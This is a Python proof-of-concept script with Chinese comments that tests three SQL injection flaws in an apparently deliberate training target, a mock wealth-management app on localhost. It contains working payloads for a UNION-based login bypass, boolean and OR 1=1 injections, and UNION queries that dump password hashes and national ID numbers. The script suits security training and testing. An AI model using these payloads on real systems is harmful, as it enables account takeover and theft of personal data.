#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL注入漏洞验证脚本 - 云享财富靶机

测试三处注入点：
  漏洞8：POST /login           username 字段（UNION注入，绕过认证）
  漏洞9：GET /api/account/<id> keyword 参数（LIKE注入，数据泄露）
  漏洞10：GET /api/messages     type 参数（字符串注入，越权读取）
"""

import sys
import requests

BASE_URL = "http://localhost:5000"

OK   = "\033[92m[✓]\033[0m"
FAIL = "\033[91m[✗]\033[0m"
INFO = "\033[94m[*]\033[0m"
WARN = "\033[93m[!]\033[0m"


def check_server():
    try:
        requests.get(BASE_URL, timeout=3)
    except requests.exceptions.ConnectionError:
        print(f"{FAIL} 无法连接到 {BASE_URL}")
        print("    请先启动应用：python app.py")
        sys.exit(1)


def login(username, password):
    s = requests.Session()
    r = s.post(f"{BASE_URL}/login",
               data={"username": username, "password": password},
               allow_redirects=False)
    return s if r.status_code == 302 else None


# ─────────────────────────────────────────────
# 漏洞8：登录接口 username 字段 —— UNION注入
# ─────────────────────────────────────────────
def test_login_injection():
    print("\n" + "─" * 56)
    print("  漏洞8：POST /login  username 字段 SQL注入")
    print("─" * 56)

    # 正常登录作为对照
    s_normal = login("zhangsan", "123456")
    if s_normal:
        name = s_normal.get(f"{BASE_URL}/api/profile").json()["data"]["username"]
        print(f"{INFO} 正常登录 zhangsan → 当前用户：{name}")
    else:
        print(f"{FAIL} 正常登录失败，请检查应用状态")
        return

    # 构造 UNION 注入：以 id=2 (lisi) 的身份登录，密码仍用 zhangsan 的 123456
    # SQL变为: SELECT id FROM users WHERE username = ''
    #          UNION SELECT id FROM users WHERE id=2--
    payload = "' UNION SELECT id FROM users WHERE id=2--"
    s_inject = requests.Session()
    r = s_inject.post(f"{BASE_URL}/login",
                      data={"username": payload, "password": "123456"},
                      allow_redirects=False)

    if r.status_code != 302:
        print(f"{FAIL} 注入未生效（HTTP {r.status_code}），请确认应用正在运行")
        return

    injected_name = s_inject.get(f"{BASE_URL}/api/profile").json()["data"]["username"]
    print(f"{WARN} 注入登录（密码仍为 123456）→ 当前用户：{injected_name}")

    if injected_name == "lisi":
        print(f"{OK} 漏洞验证成功：输入用户名为注入语句，以 lisi 身份登录，"
              f"实际并未输入 lisi 的用户名")
    else:
        print(f"    当前用户 {injected_name}，检查 payload 或数据库初始化")

    print(f"\n  Payload : {payload}")
    print(f"  执行SQL  : SELECT id FROM users WHERE username = '{payload}'")


# ─────────────────────────────────────────────
# 漏洞9：/api/account/<id>?keyword= —— LIKE注入
# ─────────────────────────────────────────────
def test_account_keyword_injection(session):
    print("\n" + "─" * 56)
    print("  漏洞9：GET /api/account/<id>?keyword=  SQL注入")
    print("─" * 56)

    # 正常请求
    normal = session.get(f"{BASE_URL}/api/account/1",
                         params={"keyword": "转账"}).json()
    count_normal = len(normal.get("data", {}).get("transactions", []))
    print(f"{INFO} 正常请求 keyword=转账：{count_normal} 条记录")

    # 布尔验证：AND 1=1 vs AND 1=2 的差异
    # payload 闭合方式：description LIKE '%{keyword}%'  →  '%x%') AND 1=1--
    r_true  = session.get(f"{BASE_URL}/api/account/1",
                          params={"keyword": "x%') AND 1=1--"})
    r_false = session.get(f"{BASE_URL}/api/account/1",
                          params={"keyword": "x%') AND 1=2--"})
    cnt_t = len(r_true.json().get("data", {}).get("transactions", []))
    cnt_f = len(r_false.json().get("data", {}).get("transactions", []))
    print(f"{INFO} 布尔注入  AND 1=1 → {cnt_t} 条  |  AND 1=2 → {cnt_f} 条")
    if cnt_t != cnt_f:
        print(f"{OK} 布尔响应差异确认，注入点有效")

    # OR 1=1 —— 读取全库所有账户的交易记录
    r_all = session.get(f"{BASE_URL}/api/account/1",
                        params={"keyword": "%') OR 1=1--"})
    cnt_all = len(r_all.json().get("data", {}).get("transactions", []))
    print(f"{INFO} OR 1=1 注入：返回 {cnt_all} 条（本账户 vs 全库）")
    if cnt_all > count_normal:
        print(f"{WARN} 获取到其他账户的交易记录（共 {cnt_all} 条）")

    # UNION注入 —— 泄露所有用户名 + 密码哈希
    # 主查询7列：id, trans_type, amount, balance_after, description, target_account, created_at
    union_pl = "%') UNION SELECT id, username, password_hash, 0, email, phone, created_at FROM users--"
    r_union = session.get(f"{BASE_URL}/api/account/1",
                          params={"keyword": union_pl})
    rows = r_union.json().get("data", {}).get("transactions", [])
    # amount 列此时为 password_hash 字符串（werkzeug 格式以 pbkdf2 开头）
    leaked = [r for r in rows
              if isinstance(r.get("amount"), str) and r["amount"].startswith("pbkdf2")]
    if leaked:
        print(f"\n{WARN} UNION注入成功，泄露 {len(leaked)} 条用户凭据：")
        for row in leaked:
            print(f"    用户名: {row['trans_type']:<12} 密码哈希: {row['amount'][:50]}...")
        print(f"{OK} 漏洞验证成功：通过 keyword 参数读取到所有用户密码哈希")
    else:
        print(f"{FAIL} UNION注入未返回预期数据，rows={len(rows)}，检查 payload")

    print(f"\n  Payload : {union_pl}")


# ─────────────────────────────────────────────
# 漏洞10：/api/messages?type= —— 字符串注入
# ─────────────────────────────────────────────
def test_messages_type_injection(session):
    print("\n" + "─" * 56)
    print("  漏洞10：GET /api/messages?type=  SQL注入")
    print("─" * 56)

    # 正常请求
    normal = session.get(f"{BASE_URL}/api/messages",
                         params={"type": "系统通知"}).json()
    count_normal = len(normal.get("data", []))
    print(f"{INFO} 正常请求 type=系统通知：{count_normal} 条消息")

    # 布尔验证
    r_true  = session.get(f"{BASE_URL}/api/messages",
                          params={"type": "系统通知' AND '1'='1"})
    r_false = session.get(f"{BASE_URL}/api/messages",
                          params={"type": "系统通知' AND '1'='2"})
    cnt_t = len(r_true.json().get("data", []))
    cnt_f = len(r_false.json().get("data", []))
    print(f"{INFO} 布尔注入  AND '1'='1 → {cnt_t} 条  |  AND '1'='2 → {cnt_f} 条")
    if cnt_t != cnt_f:
        print(f"{OK} 布尔响应差异确认，注入点有效")

    # OR '1'='1 —— 绕过 user_id 过滤，读取全库消息
    r_all = session.get(f"{BASE_URL}/api/messages",
                        params={"type": "' OR '1'='1"})
    cnt_all = len(r_all.json().get("data", []))
    print(f"{INFO} OR '1'='1 注入：返回 {cnt_all} 条（当前用户 vs 全库）")
    if cnt_all > count_normal:
        print(f"{WARN} 成功绕过 user_id，额外读取了 {cnt_all - count_normal} 条其他用户消息")

    # UNION注入 —— 泄露所有用户身份证号
    # 主查询5列：id, title, msg_type, is_read, created_at
    # 注入后：title=real_name，msg_type=id_card（18位）
    union_pl = "' UNION SELECT id, real_name, id_card, 0, created_at FROM users--"
    r_union = session.get(f"{BASE_URL}/api/messages",
                          params={"type": union_pl})
    rows = r_union.json().get("data", [])
    # id_card 为 18 位数字字符串，出现在 msg_type 字段
    leaked = [r for r in rows
              if isinstance(r.get("msg_type"), str) and len(r["msg_type"]) == 18
              and r["msg_type"].isdigit()]
    if leaked:
        print(f"\n{WARN} UNION注入成功，泄露 {len(leaked)} 条用户身份信息：")
        for row in leaked:
            print(f"    姓名: {row['title']:<8} 身份证号: {row['msg_type']}")
        print(f"{OK} 漏洞验证成功：通过 type 参数读取到所有用户身份证号")
    else:
        print(f"{FAIL} UNION注入未返回预期数据，rows={len(rows)}，检查 payload")

    print(f"\n  Payload : {union_pl}")


# ─────────────────────────────────────────────
def main():
    print("=" * 56)
    print("  SQL注入漏洞验证脚本 — 云享财富靶机")
    print("=" * 56)

    check_server()

    # 漏洞8：登录注入（无需预先登录）
    test_login_injection()

    # 获取正常会话用于后续测试
    print(f"\n{INFO} 获取正常测试会话（zhangsan / 123456）...")
    session = login("zhangsan", "123456")
    if not session:
        print(f"{FAIL} 正常登录失败，无法继续")
        sys.exit(1)

    # 漏洞9：keyword 注入
    test_account_keyword_injection(session)

    # 漏洞10：type 注入
    test_messages_type_injection(session)

    print("\n" + "=" * 56)
    print("  验证完毕")
    print("=" * 56 + "\n")


if __name__ == "__main__":
    main()
